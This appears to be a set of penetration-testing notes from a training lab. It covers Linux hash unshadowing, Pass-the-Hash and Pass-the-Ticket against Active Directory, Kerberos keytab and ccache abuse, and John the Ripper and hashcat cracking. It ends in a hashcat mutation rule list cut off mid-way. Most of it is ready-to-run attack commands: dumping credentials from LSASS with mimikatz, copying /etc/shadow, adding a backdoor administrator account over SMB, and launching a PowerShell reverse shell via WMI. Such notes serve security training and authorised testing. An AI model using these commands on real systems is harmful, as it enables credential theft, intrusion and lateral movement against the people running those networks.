# Unshadow Linux Credentials
```bash
# Create unshadow hashes to try to crack them offline
cp /etc/passwd /tmp/passwd.bak 
cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Cracking unshadowed hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```



# Pass The Hash (PtH)
## From Windows
With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a [Pass the Hash (PtH) Attack](https://academy.hackthebox.com/module/147/section/1638).
- We can use [mimikatz](https://github.com/gentilkiwi) and his module `sekurlsa::pth`
```bash
# PtH w/ mimikatz.exe
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
Now we can use ``cmd.exe`` to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.
![[PtH_with_mimikatz.jpg]]
- We can also use PowerShell [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) using SMB or WMI connections
```bash
# Import Invoke-TheHash.psd1 script
Import-Module .\Invoke-TheHash.psd1

# Create a new user "mark" & add him the Administrators group w/ SMB method. We could launch a rev shell here
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Get reverse shell using PowerShell base64 encoding (from revshells.com)
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<Base64_PowerShell_ReverseShell>"
```
## From Linux
- ``Using Impacket`` : There are several tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks 
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
```bash
# PtH using psexec
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
- ``Using NetExec``  
```bash
# PtH using NetExec
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# PtH w/ command exec
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
- ``Using Evil-winrm``
```bash
# PtH using Evil-winrm
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
- ``Using RDP`` : Be careful, we might need to bypass the `Restricted Admin Mode`. For this see [[3389 - RDP]]. 
```bash
# PtH using RDP
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
``UAC`` limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. 



# Pass The Ticket (PtT)
## From Windows
### Exporting Tickets
On Windows, tickets are processed and stored by the LSASS. We'll need administrative rights to retrieve them. This will save all tickets in ``.kirbi`` files. 
- ``Method 1 (fastest)`` : We can export the tickets using automated tools
```bash
# Export ticket w/ mimikatz
c:\tools> mimikatz.exe
mimikatz > privilege::debug
mimikatz > sekurlsa::tickets /export
<SNIP>

# Export ticket w/ Rubeus
Rubeus.exe dump /nowrap
```
- ``Method 2 (manual)`` : The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`. To perform the attack manually we'll need the user's hash.
```bash
# Extract AES256_HMAC & RC4_HMAC keys w/ mimikatz
c:\tools> mimikatz.exe
mimikatz > privilege::debug
mimikatz > sekurlsa::ekeys
<SNIP>

# Pass the Key / OverPass the Hash w/ mimikatz. Will create a cmd.exe windows in context of targeted user
c:\tools> mimikatz.exe
mimikatz > privilege::debug
mimikatz > sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>

# Pass the Key / OverPass the Hash w/ Rubeus
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't. To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
### Pass The Ticket 
Now that we have some Kerberos tickets, we can use them to move laterally within an environment. 
- We can use ``Rubeus``
```bash
# Rubeus PtT
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Rubeus PtT by importing the ticket into current session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# We could also perform PtT using the Rubeus base64 output or convert a .kirbi ticket to base64 :
# First convert .kirbi to base64 w/ PowerShell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
# Then perform PtT w/ Rubeus using base64 format
Rubeus.exe ptt /ticket:<base64_output>
```
- Or ``mimikatz``
```bash
# PtT w/ mimikatz
C:\tools> mimikatz.exe 
mimikatz > privilege::debug
mimikatz > kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
mimikatz > exit

c:\tools> dir \\DC01.inlanefreight.htb\c$
```
- We can also use ``PowerShell Remoting`` (WinRM). The user needs to have either Administrator privileges, or be a member of the ``Remote Management Users`` group. 
```bash

# Method 1 : Launch mimikatz & import a ticket (use previous method)
C:\tools> mimikatz.exe
mimikatz > privilege::debug
mimikatz > kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
mimikatz > exit

# Connect to the target machine using the imported ticket & PowerShell
powershell
Enter-PSSession -ComputerName DC01

# Method 2 : Create a sacrificial process w/ Rubeus to avoid the suppression of the ticket. This will open a new cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Launch Rubeus is the new cmd.exe windows & perform PtT
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
## From Linux
In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory, in the environment variable `KRB5CCNAME`.
### Finding KeyTab Files
- First we want to know if our machine is domain-joined, and we'll look for keytab files
```bash
# Check if linux machine is domain-joined
realm list
ps -ef | grep -i "winbind\|sssd"

# Find Keytab files
find / -name *keytab* -ls 2>/dev/null
crontab -l
```
### Abusing KeyTab Files
- We could impersonate a user w/ kinit & a KeyTab file
```bash
# Read informations about available tickets
klist -k -t 

/opt/specialfiles/carlos.keytab 
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB

# Import carlos's ticket w/ kinit
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Connect to a new share as Carlos
smbclient //dc01/carlos -k -c ls
```
- And we could extract the secrets from a keytab file. A KeyTab file contain different types of hashes & can be merged to contain multiple credentials. We'll use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
```bash
# Extracting hashes from KeyTab file
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
### Finding CCACHE Files
To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.
```bash
# Look for ccache files
ls -la /tmp
env | grep -i krb5

# Import a ccache file into our current session
klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~$ cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~$ klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```
### Using Linux Tools
Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In our scenario here, we have seted up a pivoting for the Linux host to access the DC.
```bash
# Set the KRB5CCNAME variable to a ccache file 
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

# Use Impacket to access DC01 w/ Kerberos (ccache file)
impacket-wmiexec dc01 -k

# Use evil-winrm to access DC01 w/ Kerberos (ccache file)
evil-winrm -i dc01 -r inlanefreight.htb
```
### Miscellaneous
If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.
```bash
# Convert ccache file into kirbi file. The reverse operation works the same, just reverse the operation
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Import converted ticket into Windows w/ Rubeus
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```
#### Linikatz
[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments. We need to be root on the machine ; 
this tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.


# JohnTheRipper
## Single Crack Mode
`Single Crack Mode` is one of the most common John modes used when attempting to crack passwords using a single password list. It is a brute-force attack, meaning all passwords on the list are tried, one by one, until the correct one is found.nFor example, if we have a file named `hashes_to_crack.txt` that contains `SHA-256` hashes, the command to crack them would be :
```bash
john --format=sha256 hashes_to_crack.txt
```
John will read the hashes from the specified file, and then it will try to crack them by comparing them to the words in its built-in wordlist. John will output the cracked passwords to the console and the file "john.pot" (`~/.john/john.pot`) to the current user's home directory. We can check the progress by running the `john --show` command.
## Wordlist Mode
`Wordlist Mode` is used to crack passwords using multiple lists of words. It is a dictionary attack, and is more efficient than the Single Crack Mode.
```bash
john --wordlist=<wordlist_file> --rules <hash_file>
```
First, we specify the wordlist file or files to use for cracking the password hashes. The wordlist(s) can be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma.
## Incremental Mode
`Incremental Mode` is a hybrid attack used to crack passwords using a character set, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one.
Moreover, the incremental mode can also be used to crack weak passwords, which may be challenging to crack using the standard John modes. The main difference between incremental mode and wordlist mode is the source of the password guesses. Incremental mode generates the guesses on the fly, while wordlist mode uses a predefined list of words. At the same time, the single crack mode is used to check a single password against a hash.
```bash
john --incremental <hash_file>
```

Using this command, we will read the hashes in the specified hash file and then generate all possible combinations of characters, starting with a single character and incrementing with each iteration. It is important to note that this mode is `highly resource intensive` and can take a long time to complete, depending on the complexity of the passwords, machine configuration, and the number of characters set. Additionally, it is significant to note that the default character set is limited to `a-zA-Z0-9`. Therefore, if we attempt to crack complex passwords with special characters, we need to use a custom character set.
## Cracking Files
It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them. The syntax for this can look like this :
```bash
# Main Syntax
<tool> <file_to_crack> > file.hash

# Cracking PDF 
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
                # OR
john --wordlist=<wordlist.txt> server_doc.hash
john server_doc.hash --show
```
Additionally, we can use different modes for this with our personal wordlists and rules. We have created a list that includes many but not all tools that can be used for John
```bash
# List all John scripts
locate *2john*
find / -type f -name "*2john*" 2>/dev/null
```

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John (.docx) |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
| `bitlocker2john`        | Converts Bitlocker backup (.vdh) for John     |
| `pwsafe2john.py`        |                                               |
## Cracking OpenSSL Encrypted Archives
`openssl` can be used to encrypt the `gzip` format as an example. Using the tool `file`, we can obtain information about the specified file's format.
```bash
# Example of SSL encrypted archive
file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```
When cracking OpenSSL encrypted files and archives, we can encounter many difficulties that will bring many false positives or even fail to guess the correct password. Therefore, the safest choice for success is to use the `openssl` tool in a `for-loop` that tries to extract the files from the archive directly if the password is guessed correctly.

The following one-liner will show many errors related to the GZIP format, which we can ignore. If we have used the correct password list, as in this example, we will see that we have successfully extracted another file from the archive.
```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

<SNIP>
# Once the for-loop has finished, we can look in the current folder to check if the cracking was successful.
```
## Cracking BitLocker Encrypted Devices :
We can use `bitlocker2john` to extract the hash we need to crack. [Four different hashes](https://openwall.info/wiki/john/OpenCL-BitLocker) will be extracted, which can be used with different Hashcat hash modes. For our example, we will work with the first one, which refers to the BitLocker password.
```bash
# Extract the first bitlocker's password hash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\\$0" backup.hashes > backup.hash
cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
```
Both `John` and `Hashcat` can be used for this purpose. We just need to provide Hashcat the file with the one hash, specify our password list, and specify the hash mode `-m 22100`
```bash
# Cracking bitlocker's password hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

# View the cracked hash
cat backup.cracked
```
Once we have cracked the password, we will be able to open the encrypted drives. The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password.
![[bitlocker.webp]]
```bash
# List all John formats
john --list=formats
```

| **Hash Format**      | **Example Command**                                 | **Description**                                                      |
| -------------------- | --------------------------------------------------- | -------------------------------------------------------------------- |
| afs                  | `john --format=afs hashes_to_crack.txt`             | AFS (Andrew File System) password hashes                             |
| bfegg                | `john --format=bfegg hashes_to_crack.txt`           | bfegg hashes used in Eggdrop IRC bots                                |
| bf                   | `john --format=bf hashes_to_crack.txt`              | Blowfish-based crypt(3) hashes                                       |
| bsdi                 | `john --format=bsdi hashes_to_crack.txt`            | BSDi crypt(3) hashes                                                 |
| crypt(3)             | `john --format=crypt hashes_to_crack.txt`           | Traditional Unix crypt(3) hashes                                     |
| des                  | `john --format=des hashes_to_crack.txt`             | Traditional DES-based crypt(3) hashes                                |
| dmd5                 | `john --format=dmd5 hashes_to_crack.txt`            | DMD5 (Dragonfly BSD MD5) password hashes                             |
| dominosec            | `john --format=dominosec hashes_to_crack.txt`       | IBM Lotus Domino 6/7 password hashes                                 |
| EPiServer SID hashes | `john --format=episerver hashes_to_crack.txt`       | EPiServer SID (Security Identifier) password hashes                  |
| hdaa                 | `john --format=hdaa hashes_to_crack.txt`            | hdaa password hashes used in Openwall GNU/Linux                      |
| hmac-md5             | `john --format=hmac-md5 hashes_to_crack.txt`        | hmac-md5 password hashes                                             |
| hmailserver          | `john --format=hmailserver hashes_to_crack.txt`     | hmailserver password hashes                                          |
| ipb2                 | `john --format=ipb2 hashes_to_crack.txt`            | Invision Power Board 2 password hashes                               |
| krb4                 | `john --format=krb4 hashes_to_crack.txt`            | Kerberos 4 password hashes                                           |
| krb5                 | `john --format=krb5 hashes_to_crack.txt`            | Kerberos 5 password hashes                                           |
| LM                   | `john --format=LM hashes_to_crack.txt`              | LM (Lan Manager) password hashes                                     |
| lotus5               | `john --format=lotus5 hashes_to_crack.txt`          | Lotus Notes/Domino 5 password hashes                                 |
| mscash               | `john --format=mscash hashes_to_crack.txt`          | MS Cache password hashes                                             |
| mscash2              | `john --format=mscash2 hashes_to_crack.txt`         | MS Cache v2 password hashes                                          |
| mschapv2             | `john --format=mschapv2 hashes_to_crack.txt`        | MS CHAP v2 password hashes                                           |
| mskrb5               | `john --format=mskrb5 hashes_to_crack.txt`          | MS Kerberos 5 password hashes                                        |
| mssql05              | `john --format=mssql05 hashes_to_crack.txt`         | MS SQL 2005 password hashes                                          |
| mssql                | `john --format=mssql hashes_to_crack.txt`           | MS SQL password hashes                                               |
| mysql-fast           | `john --format=mysql-fast hashes_to_crack.txt`      | MySQL fast password hashes                                           |
| mysql                | `john --format=mysql hashes_to_crack.txt`           | MySQL password hashes                                                |
| mysql-sha1           | `john --format=mysql-sha1 hashes_to_crack.txt`      | MySQL SHA1 password hashes                                           |
| NETLM                | `john --format=netlm hashes_to_crack.txt`           | NETLM (NT LAN Manager) password hashes                               |
| NETLMv2              | `john --format=netlmv2 hashes_to_crack.txt`         | NETLMv2 (NT LAN Manager version 2) password hashes                   |
| NETNTLM              | `john --format=netntlm hashes_to_crack.txt`         | NETNTLM (NT LAN Manager) password hashes                             |
| NETNTLMv2            | `john --format=netntlmv2 hashes_to_crack.txt`       | NETNTLMv2 (NT LAN Manager version 2) password hashes                 |
| NEThalfLM            | `john --format=nethalflm hashes_to_crack.txt`       | NEThalfLM (NT LAN Manager) password hashes                           |
| md5ns                | `john --format=md5ns hashes_to_crack.txt`           | md5ns (MD5 namespace) password hashes                                |
| nsldap               | `john --format=nsldap hashes_to_crack.txt`          | nsldap (OpenLDAP SHA) password hashes                                |
| ssha                 | `john --format=ssha hashes_to_crack.txt`            | ssha (Salted SHA) password hashes                                    |
| NT                   | `john --format=nt hashes_to_crack.txt`              | NT (Windows NT) password hashes                                      |
| openssha             | `john --format=openssha hashes_to_crack.txt`        | OPENSSH private key password hashes                                  |
| oracle11             | `john --format=oracle11 hashes_to_crack.txt`        | Oracle 11 password hashes                                            |
| oracle               | `john --format=oracle hashes_to_crack.txt`          | Oracle password hashes                                               |
| pdf                  | `john --format=pdf hashes_to_crack.txt`             | PDF (Portable Document Format) password hashes                       |
| phpass-md5           | `john --format=phpass-md5 hashes_to_crack.txt`      | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                 | `john --format=phps hashes_to_crack.txt`            | PHPS password hashes                                                 |
| pix-md5              | `john --format=pix-md5 hashes_to_crack.txt`         | Cisco PIX MD5 password hashes                                        |
| po                   | `john --format=po hashes_to_crack.txt`              | Po (Sybase SQL Anywhere) password hashes                             |
| rar                  | `john --format=rar hashes_to_crack.txt`             | RAR (WinRAR) password hashes                                         |
| raw-md4              | `john --format=raw-md4 hashes_to_crack.txt`         | Raw MD4 password hashes                                              |
| raw-md5              | `john --format=raw-md5 hashes_to_crack.txt`         | Raw MD5 password hashes                                              |
| raw-md5-unicode      | `john --format=raw-md5-unicode hashes_to_crack.txt` | Raw MD5 Unicode password hashes                                      |
| raw-sha1             | `john --format=raw-sha1 hashes_to_crack.txt`        | Raw SHA1 password hashes                                             |
| raw-sha224           | `john --format=raw-sha224 hashes_to_crack.txt`      | Raw SHA224 password hashes                                           |
| raw-sha256           | `john --format=raw-sha256 hashes_to_crack.txt`      | Raw SHA256 password hashes                                           |
| raw-sha384           | `john --format=raw-sha384 hashes_to_crack.txt`      | Raw SHA384 password hashes                                           |
| raw-sha512           | `john --format=raw-sha512 hashes_to_crack.txt`      | Raw SHA512 password hashes                                           |
| salted-sha           | `john --format=salted-sha hashes_to_crack.txt`      | Salted SHA password hashes                                           |
| sapb                 | `john --format=sapb hashes_to_crack.txt`            | SAP CODVN B (BCODE) password hashes                                  |
| sapg                 | `john --format=sapg hashes_to_crack.txt`            | SAP CODVN G (PASSCODE) password hashes                               |
| sha1-gen             | `john --format=sha1-gen hashes_to_crack.txt`        | Generic SHA1 password hashes                                         |
| skey                 | `john --format=skey hashes_to_crack.txt`            | S/Key (One-time password) hashes                                     |
| ssh                  | `john --format=ssh hashes_to_crack.txt`             | SSH (Secure Shell) password hashes                                   |
| sybasease            | `john --format=sybasease hashes_to_crack.txt`       | Sybase ASE password hashes                                           |
| xsha                 | `john --format=xsha hashes_to_crack.txt`            | xsha (Extended SHA) password hashes                                  |
| zip                  | `john --format=zip hashes_to_crack.txt`             | ZIP (WinZip) password hashes                                         |



# Password Mutations
Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords.

|**Description**|**Password Syntax**|
|---|---|
|First letter is uppercase.|`Password`|
|Adding numbers.|`Password123`|
|Adding year.|`Password2022`|
|Adding month.|`Password02`|
|Last character is an exclamation mark.|`Password2022!`|
|Adding special characters.|`P@ssw0rd2022!`|

We can use [Hashcat](https://hashcat.net/hashcat/) to combine lists of potential names and labels with specific mutation rules to create custom wordlists.

|**Function**|**Description**|
|---|---|
|`:`|Do nothing.|
|`l`|Lowercase all letters.|
|`u`|Uppercase all letters.|
|`c`|Capitalize the first letter and lowercase others.|
|`sXY`|Replace all instances of X with Y.|
|`$!`|Add the exclamation character at the end.|

Here is an example of a `custom_rules` files for password :
```bash
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
$1
$1 c
$1 c so0
$1 sa@
$1 c sa@
$1 c sa@ so0
$1 $!
$1 $! c
$1 $! so0
$1 $! sa@
$1 $! c so0
$1 $! c sa@
$1 $! so0 sa@
$1 $! c so0 sa@
$2
$2 c
$2 c so0
$2 sa@
$2 c sa@
$2 c sa@ so0
$2 $!
$2 $! c
$2 $! so0
$2 $! sa@
$2 $! c so0
$2 $! c sa@
$2 $! so0 sa@
$2 $! c so0 sa@
$3
$3 c
$3 c so0
$3 sa@
$3 c sa@
$3 c sa@ so0
$3 $!
$3 $! c
$3 $! so0
$3 $! sa@
$3 $! c so0
$3 $! c sa@
$3 $! so0 sa@
$3 $! c so0 sa@
$4
$4 c
$4 c so0
$4 sa@
$4 c sa@
$4 c sa@ so0
$4 $!
$4 $! c
$4 $! so0
$4 $! sa@
$4 $! c so0
$4 $! c sa@
$4 $! so0 sa@
$4 $! c so0 sa@
$5
$5 c
$5 c so0
$5 sa@
$5 c sa@
$5 c sa@ so0
$5 $!
$5 $! c
$5 $! so0
$5 $! sa@
$5 $! c so0
$5 $! c sa@
$5 $! so0 sa@
$5 $! c so0 sa@
$6
$6 c
$6 c so0
$6 sa@
$6 c sa@
$6 c sa@ so0
$6 $!
$6 $! c
$6 $! so0
$6 $! sa@
$6 $! c so0
$6 $! c sa@
$6 $! so0 sa@
$6 $! c so0 sa@
$7
$7 c
$7 c so0
$7 sa@
$7 c sa@
$7 c sa@ so0
$7 c$!
$7 c$! c
$7 $! so0
$7 $! sa@
$7 $! c so0
$7 $! c sa@
$7 $! so0 sa@
$7 $! c so0 sa@
$8
$8 c
$8 c so0
$8 sa@
$8 c sa@
$8 c sa@ so0
$8 c$!
$8 c$! c
$8 c$! so0
$8 c$! sa@
$8 c$! c so0
$8 c$! c sa@
$8 c$! so0 sa@
$8 c$! c so0 sa@
$9
$9 c
$9 c so0
$9 sa@
$9 c sa@
$9 c sa@ so0
$9 c$!
$9 c$! c
$9 c$! so0
$9 c$! sa@
$9 c$! c so0
$9 c$! c sa@
$9 c$! so0 sa@
$9 c$! c so0 sa@
$0 $1
$0 $1 c
$0 $1 c so0
$0 $1 sa@
$0 $1 c sa@
$0 $1 c sa@ so0
$0 $1 $!
$0 $1 $! c
$0 $1 $! so0
$0 $1 $! sa@
$0 $1 $! c so0
$0 $1 $! c sa@
$0 $1 $! so0 sa@
$0 $1 $! c so0 sa@
$0 $2
$0 $2 c
$0 $2 c so0
$0 $2 sa@
$0 $2 c sa@
$0 $2 c sa@ so0
$0 $2 $!
$0 $2 $! c
$0 $2 $! so0
$0 $2 $! sa@
$0 $2 $! c so0
$0 $2 $! c sa@
$0 $2 $! so0 sa@
$0 $2 $! c so0 sa@
$0 $3
$0 $3 c
$0 $3 c so0
$0 $3 sa@
$0 $3 c sa@
$0 $3 c sa@ so0
$0 $3 $!
$0 $3 $! c
$0 $3 $! so0
$0 $3 $! sa@
$0 $3 $! c so0
$0 $3 $! c sa@
$0 $3 $! so0 sa@
$0 $3 $! c so0 sa@
$0 $4
$0 $4 c
$0 $4 c so0
$0 $4 sa@
$0 $4 c sa@
$0 $4 c sa@ so0
$0 $4 $!
$0 $4 $! c
$0 $4 $! so0
$0 $4 $! sa@
$0 $4 $! c so0
$0 $4 $! c sa@
$0 $4 $! so0 sa@
$0 $4 $! c so0 sa@
$0 $5
$0 $5 c
$0 $5 c so0
$0 $5 sa@
$0 $5 c sa@
$0 $5 c sa@ so0
$0 $5 $!
$0 $5 $! c
$0 $5 $! so0
$0 $5 $! sa@
$0 $5 $! c so0
$0 $5 $! c sa@
$0 $5 $! so0 sa@
$0 $5 $! c so0 sa@
$0 $6
$0 $6 c
$0 $6 c so0
$0 $6 sa@
$0 $6 c sa@
$0 $6 c sa@ so0
$0 $6 $!
$0 $6 $! c
$0 $6 $! so0
$0 $6 $! sa@
$0 $6 $! c so0
$0 $6 $! c sa@
$0 $6 $! so0 sa@
$0 $6 $! c so0 sa@
$0 $7
$0 $7 c
$0 $7 c so0
$0 $7 sa@
$0 $7 c sa@
$0 $7 c sa@ so0
$0 $7 $!
$0 $7 $! c
$0 $7 $! so0
$0 $7 $! sa@
$0 $7 $! c so0
$0 $7 $! c sa@
$0 $7 $! so0 sa@
$0 $7 $! c so0 sa@
$0 $8
$0 $8 c
$0 $8 c so0
$0 $8 sa@
$0 $8 c sa@
$0 $8 c sa@ so0
$0 $8 $!
$0 $8 $! c
$0 $8 $! so0
$0 $8 $! sa@
$0 $8 $! c so0
$0 $8 $! c sa@
$0 $8 $! so0 sa@
$0 $8 $! c so0 sa@
$0 $9
$0 $9 c
$0 $9 c so0
$0 $9 sa@
$0 $9 c sa@
$0 $9 c sa@ so0
$0 $9 $!
$0 $9 $! c
$0 $9 $! so0
$0 $9 $! sa@
$0 $9 $! c so0
$0 $9 $! c sa@
$0 $9 $! so0 sa@
$0 $9 $! c so0 sa@
$1 $0
$1 $0 c
$1 $0 c so0
$1 $0 sa@
$1 $0 c sa@
$1 $0 c sa@ so0
$1 $0 $!
$1 $0 $! c
$1 $0 $! so0
$1 $0 $! sa@
$1 $0 $! c so0
$1 $0 $! c sa@
$1 $0 $! so0 sa@
$1 $0 $! c so0 sa@
$1 $1
$1 $1 c
$1 $1 c so0
$1 $1 sa@
$1 $1 c sa@
$1 $1 c sa@ so0
$1 $1 $!
$1 $1 $! c
$1 $1 $! so0
$1 $1 $! sa@
$1 $1 $! c so0
$1 $1 $! c sa@
